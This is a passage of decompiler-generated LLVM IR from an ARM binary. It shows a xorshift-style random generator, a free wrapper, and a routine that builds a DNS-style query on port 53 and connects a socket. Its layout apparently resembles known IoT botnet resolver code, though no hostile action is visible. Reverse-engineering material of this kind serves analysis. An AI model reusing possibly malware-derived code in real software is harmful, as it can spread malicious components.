  store i32 %v0_10d20, i32* %v2_10d20, align 4
  %v0_10d24 = load i32, i32* %sl.global-to-local, align 4
  %v1_10d24 = load i32, i32* %ip.global-to-local, align 4
  %v2_10d24 = inttoptr i32 %v1_10d24 to i32*
  store i32 %v0_10d24, i32* %v2_10d24, align 4
  %v2_10d2c.pre = load i32, i32* %stack_var_-36, align 4
  %v29_10d2c.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_10d28

dec_label_pc_10d28:                               ; preds = %dec_label_pc_10c1c, %dec_label_pc_10d0c
  %v29_10d2c = phi i32 [ %v29_10d2c.pre, %dec_label_pc_10d0c ], [ %v7_10c38, %dec_label_pc_10c1c ]
  %v2_10d2c = phi i32 [ %v2_10d2c.pre, %dec_label_pc_10d0c ], [ %v3_10c1c, %dec_label_pc_10c1c ]
  store i32 %v2_10d2c, i32* @r4, align 4
  ret i32 %v29_10d2c

; uselistorder directives
  uselistorder i32 %v1_10d04, { 1, 0 }
  uselistorder i32 %v0_10d00, { 1, 0 }
  uselistorder i32 %v5_10cdc, { 5, 6, 7, 4, 1, 0, 3, 2 }
  uselistorder i32 %v2_10cd8, { 1, 2, 0 }
  uselistorder i32 %v0_10cd0, { 1, 0 }
  uselistorder i32 %v0_10cd4, { 1, 0 }
  uselistorder i32 %v0_10ca0, { 2, 3, 0, 6, 5, 4, 1 }
  uselistorder i32 %v2_10ca8, { 1, 0 }
  uselistorder i32 %v2_10c70, { 0, 1, 2, 4, 3 }
  uselistorder i32 %v0_10c3c, { 0, 1, 3, 2 }
  uselistorder i32* %stack_var_-36, { 0, 2, 1 }
  uselistorder i32* %sl.global-to-local, { 1, 2, 0, 3, 4 }
  uselistorder i32* %sb.global-to-local, { 1, 0, 2, 3 }
  uselistorder i32* %r7.global-to-local, { 0, 2, 1, 3, 4, 5, 6, 7 }
  uselistorder i32* %r6.global-to-local, { 1, 0, 2, 3 }
  uselistorder i32* %r5.global-to-local, { 0, 2, 1 }
  uselistorder i32* %r3.global-to-local, { 0, 1, 4, 2, 3, 5 }
  uselistorder i32* %r2.global-to-local, { 3, 0, 1, 2, 4 }
  uselistorder i32* %r1.global-to-local, { 4, 1, 2, 3, 5, 0 }
  uselistorder i32* %r0.global-to-local, { 3, 1, 6, 2, 4, 5, 8, 7, 0 }
  uselistorder i1* %cpsr_z.global-to-local, { 0, 1, 4, 2, 3, 5 }
  uselistorder i1* %cpsr_v.global-to-local, { 0, 1, 4, 2, 3, 5 }
  uselistorder i1* %cpsr_n.global-to-local, { 0, 1, 4, 2, 3, 5 }
  uselistorder i32 -33, { 1, 2, 3, 4, 0 }
  uselistorder [33 x i8]* @global_var_143b8.226, { 1, 0 }
  uselistorder label %dec_label_pc_10d28, { 1, 0 }
  uselistorder label %dec_label_pc_10cd0, { 1, 0 }
}

define i32 @function_10d44(i8* %arg1) local_unnamed_addr {
dec_label_pc_10d44:
  %fp.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  %stack_var_-36 = alloca i32, align 4
  %v3_10d44 = load i32, i32* @r4, align 4
  store i32 %v3_10d44, i32* %stack_var_-36, align 4
  %v9_10d44 = load i32, i32* @r6, align 4
  %v12_10d44 = load i32, i32* @r7, align 4
  %v15_10d44 = load i32, i32* @r8, align 4
  %v18_10d44 = load i32, i32* @sb, align 4
  %v21_10d44 = load i32, i32* @sl, align 4
  %v24_10d44 = load i32, i32* @fp, align 4
  %v0_10d48 = load i32, i32* @r1, align 4
  store i32 %v0_10d48, i32* %r4.global-to-local, align 4
  store i32 %tmp, i32* %r5.global-to-local, align 4
  %tmp20 = icmp slt i32 %v0_10d48, 1
  br i1 %tmp20, label %bb, label %bb21

bb:                                               ; preds = %dec_label_pc_10d44
  store i32 %v3_10d44, i32* @r4, align 4
  ret i32 %tmp

bb21:                                             ; preds = %dec_label_pc_10d44
  store i32 ptrtoint (i32* @global_var_1cd0c.216 to i32), i32* %fp.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1cd08.220 to i32), i32* %sb.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1cd04.218 to i32), i32* %sl.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1cd00.214 to i32), i32* %r8.global-to-local, align 4
  %v2_10d64 = load i32, i32* @global_var_1cd0c.216, align 4
  store i32 %v2_10d64, i32* %lr.global-to-local, align 4
  %v2_10d68 = load i32, i32* @global_var_1cd08.220, align 4
  store i32 %v2_10d68, i32* %r7.global-to-local, align 4
  %v2_10d6c = load i32, i32* @global_var_1cd04.218, align 4
  store i32 %v2_10d6c, i32* %r6.global-to-local, align 4
  %v2_10d70 = load i32, i32* @global_var_1cd00.214, align 4
  br label %dec_label_pc_10d9c

dec_label_pc_10d78:                               ; preds = %dec_label_pc_10dc8
  %v3_10dd0 = sdiv i32 %v5_10db4, 256
  %v1_10d78 = trunc i32 %v3_10dd0 to i8
  %v3_10d78 = add i32 %v9_10dbc, 1
  %v4_10d78 = inttoptr i32 %v3_10d78 to i8*
  store i8 %v1_10d78, i8* %v4_10d78, align 1
  %v0_10d7c = load i32, i32* %r3.global-to-local, align 4
  %v1_10d7c = trunc i32 %v0_10d7c to i8
  %v2_10d7c = load i32, i32* %r5.global-to-local, align 4
  %v3_10d7c = inttoptr i32 %v2_10d7c to i8*
  store i8 %v1_10d7c, i8* %v3_10d7c, align 1
  %v0_10d80 = load i32, i32* %r5.global-to-local, align 4
  %v1_10d80 = add i32 %v0_10d80, 2
  store i32 %v1_10d80, i32* %r5.global-to-local, align 4
  %v0_10d84.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_10d84

dec_label_pc_10d84:                               ; preds = %.thread, %dec_label_pc_10d78
  %v0_10d84 = phi i32 [ %v9_10dc0, %.thread ], [ %v0_10d84.pre, %dec_label_pc_10d78 ]
  %v2_10d787 = phi i32 [ %v12_10dbc, %.thread ], [ %v1_10d80, %dec_label_pc_10d78 ]
  %tmp22 = icmp slt i32 %v0_10d84, 1
  br i1 %tmp22, label %dec_label_pc_10e04, label %dec_label_pc_10d90

dec_label_pc_10d90:                               ; preds = %dec_label_pc_10d84
  %v0_10d88 = load i32, i32* %r6.global-to-local, align 4
  %v0_10d90 = load i32, i32* %r7.global-to-local, align 4
  store i32 %v0_10d90, i32* %r6.global-to-local, align 4
  %v0_10d94 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v0_10d94, i32* %r7.global-to-local, align 4
  %v0_10d98 = load i32, i32* %r3.global-to-local, align 4
  store i32 %v0_10d98, i32* %lr.global-to-local, align 4
  br label %dec_label_pc_10d9c

dec_label_pc_10d9c:                               ; preds = %bb21, %dec_label_pc_10d90
  %v0_10dec = phi i32 [ %v2_10d6c, %bb21 ], [ %v0_10d90, %dec_label_pc_10d90 ]
  %v9_10dbc = phi i32 [ %tmp, %bb21 ], [ %v2_10d787, %dec_label_pc_10d90 ]
  %v0_10dd4 = phi i32 [ %v0_10d48, %bb21 ], [ %v0_10d84, %dec_label_pc_10d90 ]
  %v0_10de0 = phi i32 [ %v2_10d64, %bb21 ], [ %v0_10d98, %dec_label_pc_10d90 ]
  %v0_10ddc = phi i32 [ %v2_10d70, %bb21 ], [ %v0_10d88, %dec_label_pc_10d90 ]
  %v4_10d9c = mul i32 %v0_10ddc, 2048
  %v5_10d9c = xor i32 %v4_10d9c, %v0_10ddc
  %v4_10da0 = udiv i32 %v0_10de0, 524288
  %v5_10da0 = xor i32 %v4_10da0, %v0_10de0
  %v2_10da4 = xor i32 %v5_10da0, %v5_10d9c
  %v4_10db4 = udiv i32 %v5_10d9c, 256
  %v5_10db4 = xor i32 %v4_10db4, %v2_10da4
  store i32 %v5_10db4, i32* %r3.global-to-local, align 4
  %v7_10dbc = icmp sgt i32 %v0_10dd4, 3
  br i1 %v7_10dbc, label %.thread, label %dec_label_pc_10dc8

.thread:                                          ; preds = %dec_label_pc_10d9c
  %v10_10dbc = inttoptr i32 %v9_10dbc to i32*
  store i32 %v5_10db4, i32* %v10_10dbc, align 4
  %v11_10dbc = load i32, i32* %r5.global-to-local, align 4
  %v12_10dbc = add i32 %v11_10dbc, 4
  store i32 %v12_10dbc, i32* %r5.global-to-local, align 4
  %v8_10dc0 = load i32, i32* %r4.global-to-local, align 4
  %v9_10dc0 = add i32 %v8_10dc0, -4
  store i32 %v9_10dc0, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_10d84

dec_label_pc_10dc8:                               ; preds = %dec_label_pc_10d9c
  store i32 %v5_10db4, i32* %r3.global-to-local, align 4
  %v7_10dcc = icmp eq i32 %v0_10dd4, 1
  %v1_10dd4 = add i32 %v0_10dd4, -2
  store i32 %v1_10dd4, i32* %r4.global-to-local, align 4
  br i1 %v7_10dcc, label %dec_label_pc_10ddc, label %dec_label_pc_10d78

dec_label_pc_10ddc:                               ; preds = %dec_label_pc_10dc8
  store i32 %v5_10db4, i32* %r3.global-to-local, align 4
  %v1_10dec = load i32, i32* %r8.global-to-local, align 4
  %v2_10dec = inttoptr i32 %v1_10dec to i32*
  store i32 %v0_10dec, i32* %v2_10dec, align 4
  %v0_10df0 = load i32, i32* %r7.global-to-local, align 4
  %v1_10df0 = load i32, i32* %sl.global-to-local, align 4
  %v2_10df0 = inttoptr i32 %v1_10df0 to i32*
  store i32 %v0_10df0, i32* %v2_10df0, align 4
  %v0_10df4 = load i32, i32* %lr.global-to-local, align 4
  %v1_10df4 = load i32, i32* %sb.global-to-local, align 4
  %v2_10df4 = inttoptr i32 %v1_10df4 to i32*
  store i32 %v0_10df4, i32* %v2_10df4, align 4
  %v0_10df8 = load i32, i32* %r3.global-to-local, align 4
  %v1_10df8 = load i32, i32* %fp.global-to-local, align 4
  %v2_10df8 = inttoptr i32 %v1_10df8 to i32*
  store i32 %v0_10df8, i32* %v2_10df8, align 4
  %v0_10dfc = load i32, i32* %r3.global-to-local, align 4
  %v1_10dfc = trunc i32 %v0_10dfc to i8
  %v2_10dfc = load i32, i32* %r5.global-to-local, align 4
  %v3_10dfc = inttoptr i32 %v2_10dfc to i8*
  store i8 %v1_10dfc, i8* %v3_10dfc, align 1
  %v2_10e00 = load i32, i32* %stack_var_-36, align 4
  store i32 %v2_10e00, i32* @r4, align 4
  store i32 %v9_10d44, i32* @r6, align 4
  store i32 %v12_10d44, i32* @r7, align 4
  store i32 %v15_10d44, i32* @r8, align 4
  store i32 %v18_10d44, i32* @sb, align 4
  store i32 %v21_10d44, i32* @sl, align 4
  store i32 %v24_10d44, i32* @fp, align 4
  ret i32 %v5_10d9c

dec_label_pc_10e04:                               ; preds = %dec_label_pc_10d84
  %v0_10e04 = load i32, i32* %r3.global-to-local, align 4
  %v1_10e04 = load i32, i32* %fp.global-to-local, align 4
  %v2_10e04 = inttoptr i32 %v1_10e04 to i32*
  store i32 %v0_10e04, i32* %v2_10e04, align 4
  %v0_10e08 = load i32, i32* %lr.global-to-local, align 4
  %v1_10e08 = load i32, i32* %sb.global-to-local, align 4
  %v2_10e08 = inttoptr i32 %v1_10e08 to i32*
  store i32 %v0_10e08, i32* %v2_10e08, align 4
  %v0_10e0c = load i32, i32* %r7.global-to-local, align 4
  %v1_10e0c = load i32, i32* %sl.global-to-local, align 4
  %v2_10e0c = inttoptr i32 %v1_10e0c to i32*
  store i32 %v0_10e0c, i32* %v2_10e0c, align 4
  %v0_10e10 = load i32, i32* %r6.global-to-local, align 4
  %v1_10e10 = load i32, i32* %r8.global-to-local, align 4
  %v2_10e10 = inttoptr i32 %v1_10e10 to i32*
  store i32 %v0_10e10, i32* %v2_10e10, align 4
  %v2_10e14 = load i32, i32* %stack_var_-36, align 4
  store i32 %v2_10e14, i32* @r4, align 4
  store i32 %v9_10d44, i32* @r6, align 4
  store i32 %v12_10d44, i32* @r7, align 4
  store i32 %v15_10d44, i32* @r8, align 4
  store i32 %v18_10d44, i32* @sb, align 4
  store i32 %v21_10d44, i32* @sl, align 4
  store i32 %v24_10d44, i32* @fp, align 4
  ret i32 %v5_10d9c

; uselistorder directives
  uselistorder i32 %v9_10dc0, { 1, 0 }
  uselistorder i32 %v12_10dbc, { 1, 0 }
  uselistorder i32 %v5_10db4, { 1, 3, 2, 4, 0 }
  uselistorder i32 %v5_10d9c, { 1, 2, 0, 3 }
  uselistorder i32 %v0_10ddc, { 1, 0 }
  uselistorder i32 %v0_10de0, { 1, 0 }
  uselistorder i32 %v0_10d84, { 1, 0 }
  uselistorder i32 %v24_10d44, { 1, 0 }
  uselistorder i32 %v21_10d44, { 1, 0 }
  uselistorder i32 %v18_10d44, { 1, 0 }
  uselistorder i32 %v15_10d44, { 1, 0 }
  uselistorder i32 %v12_10d44, { 1, 0 }
  uselistorder i32 %v9_10d44, { 1, 0 }
  uselistorder i32* %r7.global-to-local, { 1, 2, 0, 3, 4 }
  uselistorder i32* %r6.global-to-local, { 1, 0, 2, 3 }
  uselistorder i32* %r5.global-to-local, { 2, 1, 5, 0, 3, 4, 6 }
  uselistorder i32* %r4.global-to-local, { 1, 2, 3, 0, 4 }
  uselistorder i32* %r3.global-to-local, { 5, 0, 1, 2, 4, 7, 6, 3 }
  uselistorder i32* %lr.global-to-local, { 1, 2, 0, 3, 4 }
  uselistorder i32* @global_var_1cd00.214, { 2, 3, 5, 1, 0, 4 }
  uselistorder i32* @global_var_1cd04.218, { 2, 3, 4, 1, 0, 5, 6 }
  uselistorder i32* @global_var_1cd08.220, { 3, 6, 1, 4, 2, 0, 5 }
  uselistorder i32* @global_var_1cd0c.216, { 2, 3, 5, 1, 0, 4 }
  uselistorder label %dec_label_pc_10d9c, { 1, 0 }
}

define i32 @function_10e28(i32* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_10e28:
  %r4.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  %stack_var_-8 = alloca i32, align 4
  %v3_10e28 = load i32, i32* @r4, align 4
  store i32 %v3_10e28, i32* %stack_var_-8, align 4
  store i32 %tmp, i32* %r4.global-to-local, align 4
  %v2_10e2c = icmp eq i32* %arg1, null
  br i1 %v2_10e2c, label %bb, label %bb4

bb:                                               ; preds = %dec_label_pc_10e28
  store i32 %v3_10e28, i32* @r4, align 4
  ret i32 %tmp

bb4:                                              ; preds = %dec_label_pc_10e28
  %v1_10e34 = add i32 %tmp, 4
  %v2_10e34 = inttoptr i32 %v1_10e34 to i32*
  %v3_10e34 = load i32, i32* %v2_10e34, align 4
  %v1_10e3c = icmp ne i32 %v3_10e34, 0
  call void @__pseudo_cond_branch(i1 %v1_10e3c, i32 ptrtoint (i32* @global_var_8de4.113 to i32))
  %v0_10e40 = load i32, i32* %r4.global-to-local, align 4
  %v2_10e44 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_10e44, i32* @r4, align 4
  %v1_10e48 = inttoptr i32 %v0_10e40 to i32*
  call void @free(i32* %v1_10e48)
  ret i32 ptrtoint (i32* @0 to i32)
}

define i32 @function_10e4c(i8* %arg1) local_unnamed_addr {
dec_label_pc_10e4c:
  %cpsr_z.global-to-local = alloca i1, align 1
  %fp.global-to-local = alloca i32, align 4
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-48 = alloca i32, align 4
  %stack_var_-192 = alloca i32, align 4
  %stack_var_-4288 = alloca i8, align 1
  %stack_var_-64 = alloca i32, align 4
  %stack_var_-216 = alloca i32, align 4
  %stack_var_-2227 = alloca i32, align 4
  %stack_var_-2240 = alloca i8, align 1
  %stack_var_-2228 = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %v3_10e4c = load i32, i32* @r4, align 4
  store i32 %v3_10e4c, i32* %stack_var_-36, align 4
  store i32 %tmp, i32* %r4.global-to-local, align 4
  store i32 8, i32* %r1.global-to-local, align 4
  store i32 1, i32* %r0.global-to-local, align 4
  %v2_10e64 = call i32* @calloc(i32 1, i32 8)
  %v4_10e64 = ptrtoint i32* %v2_10e64 to i32
  %v0_10e6c = load i32, i32* %r4.global-to-local, align 4
  %v1_10e6c = inttoptr i32 %v0_10e6c to i8*
  store i32 %v0_10e6c, i32* %r0.global-to-local, align 4
  %v3_10e70 = call i32 @function_1399c(i8* %v1_10e6c)
  %v2_10e78 = ptrtoint i32* %stack_var_-2228 to i32
  store i32 %v2_10e78, i32* %fp.global-to-local, align 4
  %v2_10e7c = ptrtoint i8* %stack_var_-2240 to i32
  %v1_10e80 = add i32 %v3_10e70, 1
  store i32 %v1_10e80, i32* %r0.global-to-local, align 4
  %v2_10e84 = ptrtoint i32* %stack_var_-2227 to i32
  store i32 %v2_10e84, i32* %r2.global-to-local, align 4
  store i32 %v2_10e78, i32* %r5.global-to-local, align 4
  store i32 0, i32* %lr.global-to-local, align 4
  %v2_10ec4167 = icmp eq i32 %v1_10e80, 0
  store i1 %v2_10ec4167, i1* %cpsr_z.global-to-local, align 1
  store i32 1, i32* %ip.global-to-local, align 4
  %v1_10ecc168 = or i32 %v2_10e84, 1
  store i32 %v1_10ecc168, i32* %r1.global-to-local, align 4
  %tmp125169 = icmp slt i32 %v1_10e80, 1
  br i1 %tmp125169, label %dec_label_pc_10ed4, label %dec_label_pc_10e94.lr.ph

dec_label_pc_10e94.lr.ph:                         ; preds = %dec_label_pc_10e4c
  %v0_10e94.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_10e94

dec_label_pc_10e94:                               ; preds = %dec_label_pc_10e94.lr.ph, %.thread13
  %v1_10ea8181.off0 = phi i8 [ 0, %dec_label_pc_10e94.lr.ph ], [ %extract.t184, %.thread13 ]
  %v0_10e94 = phi i32 [ %v0_10e94.pre, %dec_label_pc_10e94.lr.ph ], [ %v1_10eb8, %.thread13 ]
  %v2_10ed8170 = phi i32 [ %v2_10e84, %dec_label_pc_10e94.lr.ph ], [ %v0_10ec0, %.thread13 ]
  %v1_10e94 = inttoptr i32 %v0_10e94 to i8*
  %v2_10e94 = load i8, i8* %v1_10e94, align 1
  %v3_10e94 = zext i8 %v2_10e94 to i32
  store i32 %v3_10e94, i32* %r3.global-to-local, align 4
  %v2_10e98 = icmp eq i8 %v2_10e94, 0
  store i1 %v2_10e98, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_10e98, label %.thread7, label %bb

bb:                                               ; preds = %dec_label_pc_10e94
  %v8_10e9c = icmp eq i8 %v2_10e94, 46
  store i1 %v8_10e9c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_10e9c, label %.thread7, label %.thread

.thread:                                          ; preds = %bb
  %v4_10ea0 = inttoptr i32 %v2_10ed8170 to i8*
  store i8 %v2_10e94, i8* %v4_10ea0, align 1
  %v5_10ea0 = load i32, i32* %r2.global-to-local, align 4
  %v6_10ea0 = add i32 %v5_10ea0, 1
  store i32 %v6_10ea0, i32* %r2.global-to-local, align 4
  %v0_10ea4.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_10ea4.pr.pr, label %.thread..thread7_crit_edge, label %bb123

.thread..thread7_crit_edge:                       ; preds = %.thread
  %v1_10ea8.pre = load i32, i32* %lr.global-to-local, align 4
  %extract.t = trunc i32 %v1_10ea8.pre to i8
  br label %.thread7

.thread7:                                         ; preds = %.thread..thread7_crit_edge, %bb, %dec_label_pc_10e94
  %v1_10ea8.off0 = phi i8 [ %extract.t, %.thread..thread7_crit_edge ], [ %v1_10ea8181.off0, %bb ], [ %v1_10ea8181.off0, %dec_label_pc_10e94 ]
  %v3_10ea8 = load i32, i32* %r5.global-to-local, align 4
  %v4_10ea8 = inttoptr i32 %v3_10ea8 to i8*
  store i8 %v1_10ea8.off0, i8* %v4_10ea8, align 1
  %v0_10eac.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_10eac.pr, label %bb124, label %..thread13_crit_edge

bb123:                                            ; preds = %.thread
  store i32 %v6_10ea0, i32* %r1.global-to-local, align 4
  %v1_10eac = load i32, i32* %ip.global-to-local, align 4
  %v2_10eac = urem i32 %v1_10eac, 256
  store i32 %v2_10eac, i32* %lr.global-to-local, align 4
  br label %.thread13

..thread13_crit_edge:                             ; preds = %.thread7
  %v1_10eac11 = load i32, i32* %ip.global-to-local, align 4
  %v2_10eac12 = urem i32 %v1_10eac11, 256
  store i32 %v2_10eac12, i32* %lr.global-to-local, align 4
  br label %.thread13

bb124:                                            ; preds = %.thread7
  %v1_10eb0.pre = load i32, i32* %r2.global-to-local, align 4
  store i32 %v1_10eb0.pre, i32* %r5.global-to-local, align 4
  store i32 0, i32* %lr.global-to-local, align 4
  br label %.thread13

.thread13:                                        ; preds = %bb123, %..thread13_crit_edge, %bb124
  %v0_10ec8.pre = phi i32 [ %v2_10eac12, %..thread13_crit_edge ], [ %v2_10eac, %bb123 ], [ 0, %bb124 ]
  %v0_10eb8 = load i32, i32* %r4.global-to-local, align 4
  %v1_10eb8 = add i32 %v0_10eb8, 1
  store i32 %v1_10eb8, i32* %r4.global-to-local, align 4
  %v0_10ebc = load i32, i32* %r0.global-to-local, align 4
  %v1_10ebc = add i32 %v0_10ebc, -1
  store i32 %v1_10ebc, i32* %r0.global-to-local, align 4
  %v0_10ec0 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v0_10ec0, i32* %r2.global-to-local, align 4
  %v2_10ec4 = icmp eq i32 %v1_10ebc, 0
  store i1 %v2_10ec4, i1* %cpsr_z.global-to-local, align 1
  %v1_10ec8 = add nuw nsw i32 %v0_10ec8.pre, 1
  store i32 %v1_10ec8, i32* %ip.global-to-local, align 4
  %v1_10ecc = add i32 %v0_10ec0, 1
  store i32 %v1_10ecc, i32* %r1.global-to-local, align 4
  %tmp125 = icmp slt i32 %v1_10ebc, 1
  %extract.t184 = trunc i32 %v0_10ec8.pre to i8
  br i1 %tmp125, label %dec_label_pc_10ed4, label %dec_label_pc_10e94

dec_label_pc_10ed4:                               ; preds = %.thread13, %dec_label_pc_10e4c
  %v2_10ed8.lcssa = phi i32 [ %v2_10e84, %dec_label_pc_10e4c ], [ %v0_10ec0, %.thread13 ]
  %tmp126 = bitcast i32* %v2_10e64 to i8*
  store i32 0, i32* %r4.global-to-local, align 4
  %v3_10ed8 = inttoptr i32 %v2_10ed8.lcssa to i8*
  store i8 0, i8* %v3_10ed8, align 1
  store i32 %v2_10e78, i32* %r0.global-to-local, align 4
  %v1_10ee0 = bitcast i32* %stack_var_-2228 to i8*
  %v2_10ee0 = call i32 @function_1399c(i8* %v1_10ee0)
  %v2_10ee4 = ptrtoint i32* %stack_var_-216 to i32
  store i32 %v2_10ee4, i32* %r1.global-to-local, align 4
  %v0_10ee8 = load i32, i32* %fp.global-to-local, align 4
  %v2_10ee8 = add i32 %v0_10ee8, %v2_10ee0
  store i32 %v2_10ee8, i32* %r5.global-to-local, align 4
  %v0_10eec = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_10eec, i32* %stack_var_-64, align 4
  store i32 %v2_10e78, i32* %r0.global-to-local, align 4
  %v2_10f00 = call i32 @function_1399c(i8* %v1_10ee0)
  %v1_10f04 = add i32 %v2_10f00, 17
  store i32 %v1_10f04, i32* %r0.global-to-local, align 4
  %v0_10f0c = call i32 @function_10b68()
  %v2_10f18 = urem i32 %v0_10f0c, 65535
  store i32 16, i32* %r1.global-to-local, align 4
  store i32 %v2_10f18, i32* %r3.global-to-local, align 4
  %v2_10f2c = ptrtoint i32* %stack_var_-64 to i32
  store i32 %v2_10f2c, i32* %r0.global-to-local, align 4
  %v2_10f34 = call i32 @function_13a3c(i32 %v2_10f2c, i32 16)
  %sext = mul i32 %v2_10f18, 16777216
  %v4_10f38 = sdiv i32 %sext, 16777216
  store i32 2, i32* %stack_var_-64, align 4
  store i32 %v2_10ee4, i32* %r3.global-to-local, align 4
  store i32 53, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r0.global-to-local, align 4
  store i32 %v4_10f38, i32* %lr.global-to-local, align 4
  %v0_10f80 = load i32, i32* %r5.global-to-local, align 4
  %v2_10f80 = add i32 %v0_10f80, 1
  store i32 %v2_10f80, i32* %ip.global-to-local, align 4
  %v2_10f84 = ptrtoint i8* %stack_var_-4288 to i32
  store i32 %v2_10f84, i32* %r1.global-to-local, align 4
  %v5_10f88 = trunc i32 %v4_10f38 to i8
  store i8 %v5_10f88, i8* %stack_var_-2240, align 1
  %v0_10fa0 = load i32, i32* %r4.global-to-local, align 4
  %v1_10fa0 = trunc i32 %v0_10fa0 to i8
  %v4_10fa0 = inttoptr i32 %v2_10f80 to i8*
  store i8 %v1_10fa0, i8* %v4_10fa0, align 1
  %v0_10fa4 = load i32, i32* %r4.global-to-local, align 4
  %v1_10fa4 = trunc i32 %v0_10fa4 to i8
  %v2_10fa4 = load i32, i32* %ip.global-to-local, align 4
  %v3_10fa4 = add i32 %v2_10fa4, 2
  %v4_10fa4 = inttoptr i32 %v3_10fa4 to i8*
  store i8 %v1_10fa4, i8* %v4_10fa4, align 1
  %v0_10fa8 = load i32, i32* %r0.global-to-local, align 4
  %v1_10fa8 = trunc i32 %v0_10fa8 to i8
  %v2_10fa8 = load i32, i32* %ip.global-to-local, align 4
  %v3_10fa8 = add i32 %v2_10fa8, 3
  %v4_10fa8 = inttoptr i32 %v3_10fa8 to i8*
  store i8 %v1_10fa8, i8* %v4_10fa8, align 1
  %v0_10fac = load i32, i32* %r0.global-to-local, align 4
  %v1_10fac = trunc i32 %v0_10fac to i8
  %v2_10fac = load i32, i32* %ip.global-to-local, align 4
  %v3_10fac = add i32 %v2_10fac, 1
  %v4_10fac = inttoptr i32 %v3_10fac to i8*
  store i8 %v1_10fac, i8* %v4_10fac, align 1
  %v0_10fb4 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_10fb4, i32* %sl.global-to-local, align 4
  store i32 -1, i32* %r7.global-to-local, align 4
  %v2_10fbc = ptrtoint i32* %stack_var_-192 to i32
  store i32 %v2_10fbc, i32* %r6.global-to-local, align 4
  %v4_11010 = bitcast i8* %stack_var_-2240 to i32*
  %v2_11060 = ptrtoint i32* %stack_var_-36 to i32
  %v2_1108c = ptrtoint i32* %stack_var_-48 to i32
  %tmp128 = bitcast i32* %stack_var_-192 to %_TYPEDEF_fd_set*
  %v7_110e8 = bitcast i8* %stack_var_-4288 to i32*
  %v1_11164 = add i32 %v2_10f84, 12
  %v1_1116c = inttoptr i32 %v1_11164 to i8*
  %v1_11180 = add i32 %v2_10f84, 1
  %v2_11180 = inttoptr i32 %v1_11180 to i8*
  %tmp131 = bitcast i32* %stack_var_-48 to %timeval*
  %v1_1119c = add i32 %v2_10f84, 6
  %v2_1119c = inttoptr i32 %v1_1119c to i8*
  %v1_111a0 = add i32 %v2_10f84, 7
  %v2_111a0 = inttoptr i32 %v1_111a0 to i8*
  br label %dec_label_pc_10fc0

dec_label_pc_10fc0:                               ; preds = %dec_label_pc_11114, %dec_label_pc_10ed4
  %v1_10fc4 = phi i32 [ %v0_10fc0.pre, %dec_label_pc_11114 ], [ -1, %dec_label_pc_10ed4 ]
  %v7_10fc0 = icmp eq i32 %v1_10fc4, -1
  store i1 %v7_10fc0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_10fc0, label %bb130, label %bb129

bb129:                                            ; preds = %dec_label_pc_10fc0
  store i32 %v1_10fc4, i32* %r0.global-to-local, align 4
  br label %bb130

bb130:                                            ; preds = %dec_label_pc_10fc0, %bb129
  store i32 69580, i32* %lr.global-to-local, align 4
  %v1_10fc8 = xor i1 %v7_10fc0, true
  call void @__pseudo_cond_branch(i1 %v1_10fc8, i32 ptrtoint (i32* @global_var_8dcc.80 to i32))
  store i32 2, i32* %r0.global-to-local, align 4
  store i32 2, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v3_10fd8 = call i32 @socket(i32 2, i32 0, i32 0)
  store i32 %v3_10fd8, i32* %r0.global-to-local, align 4
  %v7_10fdc = icmp eq i32 %v3_10fd8, -1
  store i1 %v7_10fdc, i1* %cpsr_z.global-to-local, align 1
  store i32 %v3_10fd8, i32* %r7.global-to-local, align 4
  br i1 %v7_10fdc, label %dec_label_pc_11154, label %dec_label_pc_10fe8

dec_label_pc_10fe8:                               ; preds = %bb130
  store i32 %v2_10f2c, i32* %r1.global-to-local, align 4
  store i32 16, i32* %r2.global-to-local, align 4
  %v3_10ff4 = call i32 @_connect(i32 %v3_10fd8, i32 %v2_10f2c, i32 16)
  store i32 %v3_10ff4, i32* %r0.global-to-local, align 4
  %v7_10ff8 = icmp eq i32 %v3_10ff4, -1
  store i1 %v7_10ff8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_10ff8, label %dec_label_pc_1111c, label %dec_label_pc_11000

dec_label_pc_11000:                               ; preds = %dec_label_pc_10fe8
  %v0_11000 = load i32, i32* %r7.global-to-local, align 4
  store i32 %v0_11000, i32* %r0.global-to-local, align 4
  store i32 %v2_10e7c, i32* %r1.global-to-local, align 4
